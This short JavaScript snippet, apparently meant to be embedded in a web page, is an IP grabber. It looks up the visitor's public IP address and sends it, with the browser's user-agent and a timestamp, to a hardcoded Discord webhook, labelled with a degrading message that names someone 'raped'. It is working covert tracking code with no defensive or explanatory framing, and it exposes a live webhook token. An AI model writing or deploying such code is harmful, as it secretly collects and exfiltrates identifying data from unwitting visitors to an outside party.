fetch("https://api.ipify.org?format=json")
.then(response => response.json())
.then(data => {

    fetch("https://discord.com/api/webhooks/1472378891703423228/97MFKZtTfRIkLTzSXaG63mIZE2wNsCTISrLbs5ZR52w7GVeKM-N52jb-uSzbkU-0lEzA", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            content:
                "🖥️ zola raped\n" +
                "IP: " + data.ip + "\n" +
                "User-Agent: " + navigator.userAgent + "\n" +
                "Idő: " + new Date().toISOString()
        })
    });

})
.catch(error => console.error("Hiba:", error));
